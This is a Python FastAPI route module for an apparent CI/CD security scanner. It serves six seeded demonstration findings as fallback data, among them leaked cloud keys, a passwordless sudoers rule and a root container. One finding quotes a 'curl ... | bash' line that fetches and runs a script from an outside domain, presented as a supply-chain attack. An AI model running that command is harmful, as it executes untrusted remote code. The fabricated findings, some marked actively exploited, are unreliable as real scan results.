"""CI/CD & Automation Security API Routes."""
from datetime import datetime
from typing import Any

from fastapi import APIRouter, Depends
from pydantic import BaseModel
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import desc, select

from app.core.database import get_db
from app.models.finding import Finding
from app.services.connector_check import is_connector_configured
from app.services.claw_scan import has_live_adapter, run_claw_scan

router = APIRouter(prefix="/automationclaw", tags=["Security Automation"])
CLAW_NAME = "automationclaw"


class AutomationTaskRequest(BaseModel):
    swarm_job_id: str
    task_type: str
    input: dict[str, Any] = {}
    classification: str = "internal"
    model_profile: str | None = None
    allowed_actions: list[str] = ["read", "analyze", "recommend"]

PROVIDER_MAP = [
    {"provider": "github_actions", "label": "GitHub Actions",  "connector_type": "github"},
    {"provider": "jenkins",        "label": "Jenkins",         "connector_type": "jenkins"},
    {"provider": "gitlab_ci",      "label": "GitLab CI",       "connector_type": "gitlab"},
]

_FINDINGS = [
    {
        "id": "auto-001",
        "claw": "automationclaw",
        "provider": "github_actions",
        "title": "Hardcoded AWS Access Key in GitHub Actions CI/CD Pipeline",
        "description": (
            "GitHub secret scanning detected an active AWS access key hardcoded directly "
            "in the GitHub Actions workflow file '.github/workflows/deploy-prod.yml' at line 47. "
            "The credential (AKIAIOSFODNN7EXAMPLE... format, confirmed active via AWS STS "
            "GetCallerIdentity) is assigned to IAM user 'ci-deploy-prod' "
            "(arn:aws:iam::123456789012:user/ci-deploy-prod). "
            "This user has ECS deploy, ECR push, and S3 PutObject permissions across all "
            "production resources. The workflow file was committed 8 days ago and has been "
            "executed 23 times since — meaning the credential has been visible in workflow "
            "logs to all 142 members of the engineering GitHub org. "
            "CloudTrail shows 7 API calls from an unrecognized IP (185.220.101.6) using "
            "this key in the past 48 hours."
        ),
        "category": "secret_exposure",
        "severity": "CRITICAL",
        "resource_id": ".github/workflows/deploy-prod.yml",
        "resource_type": "CICDPipeline",
        "resource_name": "deploy-prod.yml",
        "region": "us-east-1",
        "status": "OPEN",
        "remediation": (
            "1. Immediately deactivate the exposed AWS key via IAM console. "
            "2. Investigate the 7 CloudTrail API calls from 185.220.101.6 for unauthorized activity. "
            "3. Rotate and replace with GitHub Actions OIDC federation — eliminates long-lived keys. "
            "4. Remove the key from git history using 'git filter-repo' (deletion alone is insufficient). "
            "5. Enable GitHub secret scanning with push protection to block future credential commits. "
            "6. Audit all 23 workflow run logs to ensure no downstream secret leakage."
        ),
        "remediation_effort": "quick_win",
        "risk_score": 99.0,
        "actively_exploited": True,
        "first_seen": "2024-01-07T14:22:00Z",
        "external_id": "AUTO-GH-20240107-001",
    },
    {
        "id": "auto-002",
        "claw": "automationclaw",
        "provider": "jenkins",
        "title": "Automation Script Runs sudo Without Password — NOPASSWD in Sudoers",
        "description": (
            "Jenkins pipeline job 'infra-provisioning-prod' executes a bash script "
            "('scripts/provision.sh') that requires elevated privileges. To avoid prompts, "
            "the Jenkins service account 'jenkins-svc' has been added to /etc/sudoers with "
            "the NOPASSWD flag: 'jenkins-svc ALL=(ALL) NOPASSWD: ALL'. "
            "This grants the Jenkins service account unrestricted root access on all build "
            "agents (10 hosts) without any password, MFA, or approval mechanism. "
            "Any code that executes within a Jenkins pipeline — including third-party plugins, "
            "pulled dependencies, or injected malicious steps — can escalate to root "
            "on the build agent and then pivot to any system accessible from it. "
            "The build agents have network access to the production VPC via a peering connection."
        ),
        "category": "privilege_escalation",
        "severity": "CRITICAL",
        "resource_id": "jenkins-build-agent-cluster",
        "resource_type": "CICDBuildAgent",
        "resource_name": "jenkins-build-agents (10 hosts)",
        "region": "us-east-1",
        "status": "OPEN",
        "remediation": (
            "1. Immediately remove 'NOPASSWD: ALL' from sudoers for jenkins-svc. "
            "2. Identify the specific commands requiring sudo — whitelist only those exact commands. "
            "3. Replace with targeted sudoers rules: 'jenkins-svc ALL=(ALL) NOPASSWD: /usr/bin/specific-cmd'. "
            "4. Alternatively, refactor provision.sh to use IAM roles and AWS APIs instead of local sudo. "
            "5. Isolate build agents from production VPC — they should not have direct prod network access. "
            "6. Audit all Jenkins plugins for malicious or outdated versions."
        ),
        "remediation_effort": "medium_term",
        "risk_score": 94.0,
        "actively_exploited": False,
        "first_seen": "2024-01-01T00:00:00Z",
        "external_id": "AUTO-JENKINS-20240101-002",
    },
    {
        "id": "auto-003",
        "claw": "automationclaw",
        "provider": "github_actions",
        "title": "RPA Bot Running with Domain Admin Service Account",
        "description": (
            "Robotic Process Automation (RPA) bot 'rpa-finance-reconciliation' (UiPath) "
            "is configured to run under domain service account CORP\\svc-rpa-admin — "
            "a member of the Domain Admins group. The bot performs automated invoice "
            "reconciliation between SAP and Salesforce, a task requiring read access to "
            "two specific database schemas and write access to one reconciliation table. "
            "Domain Admin privileges provide vastly more access than needed: "
            "full control of Active Directory, all file shares, all domain-joined hosts. "
            "RPA bots are high-value targets because they run automated workflows that "
            "can be hijacked to execute arbitrary actions under their service account. "
            "The bot's credential is stored in the UiPath Orchestrator credential store "
            "which has not been rotated in 14 months."
        ),
        "category": "excessive_privilege",
        "severity": "CRITICAL",
        "resource_id": "rpa-finance-reconciliation-bot",
        "resource_type": "RPABot",
        "resource_name": "rpa-finance-reconciliation",
        "region": "us-east-1",
        "status": "OPEN",
        "remediation": (
            "1. Create a new least-privilege service account 'svc-rpa-finance' with only the required DB permissions. "
            "2. Remove CORP\\svc-rpa-admin from Domain Admins group immediately. "
            "3. Reconfigure the UiPath bot to use svc-rpa-finance. "
            "4. Rotate the credential in UiPath Orchestrator and implement 90-day auto-rotation. "
            "5. Audit all RPA bots for over-privileged service accounts — this is likely not isolated. "
            "6. Implement PAM solution for RPA credential management with session recording."
        ),
        "remediation_effort": "quick_win",
        "risk_score": 91.0,
        "actively_exploited": False,
        "first_seen": "2024-01-01T00:00:00Z",
        "external_id": "AUTO-GH-20240101-003",
    },
    {
        "id": "auto-004",
        "claw": "automationclaw",
        "provider": "github_actions",
        "title": "Unreviewed Automation PR Merged to Main — Security Pipeline Bypassed",
        "description": (
            "GitHub Actions workflow PR #1247 ('Update deployment automation — add prod deploy step') "
            "was merged to the main branch on January 14 without any code review approval. "
            "The PR was authored by contractor account redacted_user and merged "
            "by the same account 4 minutes after opening — exploiting a missing branch protection "
            "rule that should require at least 1 approval. "
            "The merged code adds a new deploy step that executes: "
            "'curl https://external-cdn.net/deploy-helper.sh | bash' — downloading and executing "
            "a script from an external domain not in the approved vendors list. "
            "The external domain was registered 3 days ago (whois: privacy-protected registrant). "
            "This is a textbook supply chain injection pattern."
        ),
        "category": "supply_chain",
        "severity": "CRITICAL",
        "resource_id": "github-corp-core-platform-pr-1247",
        "resource_type": "GitPullRequest",
        "resource_name": "corp/core-platform PR #1247",
        "region": "us-east-1",
        "status": "OPEN",
        "remediation": (
            "1. Immediately revert PR #1247 from main — do not allow the curl|bash step to execute. "
            "2. Analyze the content of https://external-cdn.net/deploy-helper.sh for malicious code. "
            "3. Check if the script executed in any pipeline run since the merge — review run logs. "
            "4. Enable branch protection on main: require 2 approvals, block self-merging. "
            "5. Add CODEOWNERS rule requiring Security team review for all workflow file changes. "
            "6. Audit contractor_lchang's recent activity — this may be a compromised account."
        ),
        "remediation_effort": "quick_win",
        "risk_score": 96.0,
        "actively_exploited": True,
        "first_seen": "2024-01-14T11:33:00Z",
        "external_id": "AUTO-GH-20240114-004",
    },
    {
        "id": "auto-005",
        "claw": "automationclaw",
        "provider": "gitlab_ci",
        "title": "Secrets in Pipeline Environment Variables — Visible in Job Logs (Unmasked)",
        "description": (
            "GitLab CI pipeline 'production-deploy' (project: corp/payment-service) has "
            "3 secret values configured as CI/CD variables without the 'Masked' flag enabled: "
            "STRIPE_SECRET_KEY (production payment processor API key), "
            "DATABASE_URL (contains production DB password in connection string), and "
            "SLACK_WEBHOOK_URL (allows posting to all corp Slack channels). "
            "Without masking, these values are printed in plain text in the job execution "
            "log, which is visible to all 67 project members. "
            "The Stripe key has transactional capability (not read-only) — exposure "
            "could allow unauthorized charges or refunds. "
            "Job logs are retained for 30 days and have been accumulating these secrets "
            "for the past 22 days across 340+ pipeline runs."
        ),
        "category": "secret_exposure",
        "severity": "HIGH",
        "resource_id": "gitlab-corp-payment-service-ci-vars",
        "resource_type": "CICDPipeline",
        "resource_name": "corp/payment-service CI/CD",
        "region": "us-east-1",
        "status": "OPEN",
        "remediation": (
            "1. Immediately rotate STRIPE_SECRET_KEY — it has been exposed in 340+ pipeline logs. "
            "2. Rotate the production database password and update DATABASE_URL. "
            "3. Rotate the Slack webhook URL. "
            "4. Enable the 'Masked' flag on all three CI/CD variables in GitLab settings. "
            "5. Delete or expire the 340+ historical job logs containing the exposed values. "
            "6. Migrate secrets to HashiCorp Vault or AWS Secrets Manager with GitLab OIDC integration."
        ),
        "remediation_effort": "quick_win",
        "risk_score": 87.0,
        "actively_exploited": False,
        "first_seen": "2023-12-24T00:00:00Z",
        "external_id": "AUTO-GITLAB-20231224-005",
    },
    {
        "id": "auto-006",
        "claw": "automationclaw",
        "provider": "jenkins",
        "title": "Automation Pipeline Running as Root in Production Environment",
        "description": (
            "Jenkins pipeline job 'data-sync-prod' runs its container workload as UID 0 (root) "
            "in the production Kubernetes cluster (prod-eks-cluster-us-east-1). "
            "The pod spec sets 'runAsUser: 0' and 'allowPrivilegeEscalation: true'. "
            "Container breakout vulnerabilities (such as CVE-2024-21626 runc vulnerability) "
            "are immediately exploitable as root, allowing an attacker to escape the container "
            "and compromise the underlying EC2 node. "
            "The node runs 12 other production workloads — a single container breakout "
            "gives an attacker access to all pod secrets on the node via the kubelet API. "
            "OPA Gatekeeper policies should prevent root containers, but the policy is in "
            "'warn' mode rather than 'deny' mode and was never enforced on this namespace."
        ),
        "category": "container_security",
        "severity": "HIGH",
        "resource_id": "prod-eks-cluster-us-east-1/data-sync-prod",
        "resource_type": "KubernetesPod",
        "resource_name": "data-sync-prod",
        "region": "us-east-1",
        "status": "OPEN",
        "remediation": (
            "1. Update the data-sync-prod pod spec: set runAsUser to a non-zero UID (e.g., 1000). "
            "2. Set allowPrivilegeEscalation: false and readOnlyRootFilesystem: true. "
            "3. Switch OPA Gatekeeper policy from 'warn' to 'deny' mode for all production namespaces. "
            "4. Patch the runc version on all EKS nodes to address CVE-2024-21626. "
            "5. Implement Pod Security Admission (PSA) in 'restricted' mode as defense-in-depth. "
            "6. Audit all Kubernetes workloads for runAsUser: 0 — this is likely not isolated."
        ),
        "remediation_effort": "medium_term",
        "risk_score": 83.0,
        "actively_exploited": False,
        "first_seen": "2024-01-05T00:00:00Z",
        "external_id": "AUTO-JENKINS-20240105-006",
    },
]


@router.get("/stats", summary="Security Automation summary statistics")
async def get_stats(db: AsyncSession = Depends(get_db)):
    from sqlalchemy import select
    from app.models.finding import Finding
    result = await db.execute(select(Finding).where(Finding.claw == CLAW_NAME))
    findings = result.scalars().all()
    if not findings:
        severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0}
        open_count = 0; providers = set()
        for f in _FINDINGS:
            sev = f["severity"].lower()
            if sev in severity_counts: severity_counts[sev] += 1
            if f.get("status") == "OPEN": open_count += 1
            providers.add(f["provider"])
        return {"total": len(_FINDINGS), "critical": severity_counts["critical"],
                "high": severity_counts["high"], "medium": severity_counts["medium"],
                "low": severity_counts["low"], "open": open_count,
                "resolved": len(_FINDINGS) - open_count,
                "providers_connected": len(providers), "last_scan": None}
    by_sev = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
    open_count = 0; providers = set(); last_seen = None
    for f in findings:
        sev = f.severity.value if hasattr(f.severity, "value") else str(f.severity)
        if sev in by_sev: by_sev[sev] += 1
        if (f.status.value if hasattr(f.status, "value") else str(f.status)) == "open": open_count += 1
        if f.provider: providers.add(f.provider)
        if f.last_seen and (last_seen is None or f.last_seen > last_seen): last_seen = f.last_seen
    return {"total": len(findings), "critical": by_sev["critical"], "high": by_sev["high"],
            "medium": by_sev["medium"], "low": by_sev["low"], "open": open_count,
            "resolved": len(findings) - open_count, "providers_connected": len(providers),
            "last_scan": last_seen.isoformat() if last_seen else None}


@router.get("/findings", summary="All Security Automation findings")
async def get_findings(db: AsyncSession = Depends(get_db)):
    from sqlalchemy import select
    from app.models.finding import Finding
    from app.services.connector_check import is_connector_configured
    result = await db.execute(
        select(Finding).where(Finding.claw == CLAW_NAME).order_by(Finding.risk_score.desc())
    )
    findings = result.scalars().all()
    if not findings:
        any_configured = any([
            await is_connector_configured(db, p["connector_type"])
            for p in PROVIDER_MAP if p.get("connector_type")
        ])
        if not any_configured or not has_live_adapter(PROVIDER_MAP):
            # Showing labelled demonstration findings is more honest than an
            # empty module: this Claw has no adapter that could have returned
            # tenant data, so an empty list would read as a broken scan.
            return _FINDINGS
        return []
    return [
        {
            "id": str(f.id), "claw": f.claw, "provider": f.provider,
            "title": f.title, "description": f.description, "category": f.category,
            "severity": f.severity.value if hasattr(f.severity, "value") else f.severity,
            "status": f.status.value if hasattr(f.status, "value") else f.status,
            "resource_id": f.resource_id, "resource_type": f.resource_type,
            "resource_name": f.resource_name, "region": f.region,
            "risk_score": f.risk_score, "actively_exploited": f.actively_exploited,
            "remediation": f.remediation, "remediation_effort": f.remediation_effort,
            "external_id": f.external_id,
            "first_seen": f.first_seen.isoformat() if f.first_seen else None,
            "last_seen": f.last_seen.isoformat() if f.last_seen else None,
        }
        for f in findings
    ]


@router.get("/providers", summary="Security Automation provider connection status")
async def get_providers(db: AsyncSession = Depends(get_db)):
    from app.services.connector_check import check_providers
    return await check_providers(db, PROVIDER_MAP)


@router.post("/scan", summary="Run Security Automation scan and persist findings")
async def run_scan(db: AsyncSession = Depends(get_db)):
    """Run an Security Automation scan. Persists via the finding pipeline for dedup, policy eval, and alerting."""
    from app.services.finding_pipeline import ingest_findings
    return await run_claw_scan(
        db,
        claw=CLAW_NAME,
        provider_config=PROVIDER_MAP,
        demo_findings=_FINDINGS,
    )


@router.post("/task", summary="Execute focused Security Automation swarm task")
async def run_automation_task(payload: AutomationTaskRequest, db: AsyncSession = Depends(get_db)):
    started = datetime.utcnow()
    any_configured = any([
        await is_connector_configured(db, p["connector_type"])
        for p in PROVIDER_MAP if p.get("connector_type")
    ])
    result = await db.execute(
        select(Finding).where(Finding.claw == CLAW_NAME).order_by(desc(Finding.risk_score)).limit(5)
    )
    findings = result.scalars().all()
    fallback = _FINDINGS[:3] if not findings else []
    max_risk = max(
        [float(f.risk_score or 0.0) for f in findings],
        default=max([float(f.get("risk_score") or 0.0) for f in fallback], default=0.0),
    )
    severity = "critical" if max_risk >= 85 else "high" if max_risk >= 70 else "medium" if max_risk >= 40 else "low"
    confidence = 0.88 if findings else 0.74
    elapsed_ms = int((datetime.utcnow() - started).total_seconds() * 1000)
    rows = [
        {"title": f.title, "detail": f"{f.provider or 'automation'} finding severity={f.severity.value if hasattr(f.severity, 'value') else f.severity}"}
        for f in findings[:3]
    ] or [
        {"title": f.get("title", "Automation finding"), "detail": (f.get("description", "")[:220] or "Simulation finding")}
        for f in fallback
    ]
    return {
        "task_id": f"automation-task-{int(started.timestamp())}",
        "swarm_job_id": payload.swarm_job_id,
        "claw": "automationclaw",
        "status": "completed",
        "severity": severity,
        "confidence": confidence,
        "risk_score": max_risk,
        "findings": rows or [{"title": "No automation findings", "detail": "Run /automationclaw/scan first."}],
        "evidence": [],
        "recommended_actions": [
            "Rotate CI/CD credentials and enforce OIDC federation",
            "Apply least-privilege and branch protection on deployment workflows",
        ],
        "blocked_actions": [],
        "policy_decisions": [],
        "compliance_mappings": ["SLSA", "NIST CM-5"],
        "execution_time_ms": elapsed_ms,
        "data_source": "persisted_db" if findings else "seeded_fallback",
        "connector_state": "configured" if any_configured else "unconfigured",
    }
